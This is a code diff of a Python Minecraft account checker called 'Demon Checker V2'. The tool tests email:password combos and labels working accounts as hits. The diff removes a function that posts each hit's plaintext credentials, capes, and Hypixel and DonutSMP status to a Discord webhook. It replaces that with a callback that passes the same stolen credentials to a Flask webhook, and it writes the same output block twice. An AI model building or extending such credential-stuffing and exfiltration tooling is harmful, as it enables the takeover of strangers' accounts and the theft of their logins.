@@ -144,33 +144,7 @@ def check_donutsmp_status(mc_name, mc_uuid, mc_token):
         pass
     return donut_data
 
-def send_discord_webhook(email, password, name, uuid, capes, hypixel_info, donut_info, webhook_url):
-    if not webhook_url:
-        return
-    try:
-        payload = {
-            "username": "Demon Checker V2",
-            "embeds": [
-                {
-                    "title": "🎯 Minecraft Account Hit Found!",
-                    "color": 65280,  # Green
-                    "fields": [
-                        {"name": "Email & Password", "value": f"`{email}:{password}`", "inline": False},
-                        {"name": "Username", "value": f"`{name}`", "inline": True},
-                        {"name": "UUID", "value": f"`{uuid}`", "inline": True},
-                        {"name": "Capes", "value": f"{capes}", "inline": False},
-                        {"name": "Hypixel Status", "value": f"**{hypixel_info['status']}**\nReason: {hypixel_info['reason']}", "inline": True},
-                        {"name": "DonutSMP Status", "value": f"**{donut_info['status']}**\nReason: {donut_info['reason']}", "inline": True}
-                    ],
-                    "footer": {"text": "Hybrid Python + Go Checker"}
-                }
-            ]
-        }
-        requests.post(webhook_url, json=payload, timeout=5)
-    except:
-        pass
-
-def run(input_path, output_path, user_webhook=None):
+def run(input_path, output_path, hit_callback=None):
     res_dir = os.path.dirname(output_path)
     os.makedirs(res_dir, exist_ok=True)
     
@@ -225,11 +199,24 @@ def run(input_path, output_path, user_webhook=None):
         )
         capture_list.append(cap_block)
 
-        # Send to Discord Webhook directly
-        send_discord_webhook(email, password, name, player_uuid, cape_list, hypixel_stats, donut_info, user_webhook)
+        # Trigger Flask Webhook Callback properly
+        if hit_callback:
+            try:
+                hit_callback(
+                    email=email, password=password, account_type="Minecraft Java",
+                    capes=cape_list, hypixel_rank=hypixel_stats['status'],
+                    hypixel_level=hypixel_stats['reason'], donut_status=donut_info['status'],
+                    donut_reason=donut_info['reason']
+                )
+            except:
+                pass
 
     with open(os.path.join(res_dir, "Hits.txt"), 'w', encoding='utf-8') as h_file:
         h_file.write("\n".join(hits_list) + ("\n" if hits_list else ""))
+
+    final_output = ["=== HITS [+] ===\n"] + [f"{h}\n" for h in hits_list] + ["\n=== BAD [-] ===\n"] + [f"{b}\n" for b in bad_list] + ["\n=== CAPTURES ===\n"] + capture_list
+    with open(output_path, 'w', encoding='utf-8', errors='replace') as out:
+        out.writelines(final_output)
 
     final_output = ["=== HITS [+] ===\n"] + [f"{h}\n" for h in hits_list] + ["\n=== BAD [-] ===\n"] + [f"{b}\n" for b in bad_list] + ["\n=== CAPTURES ===\n"] + capture_list
     with open(output_path, 'w', encoding='utf-8', errors='replace') as out:
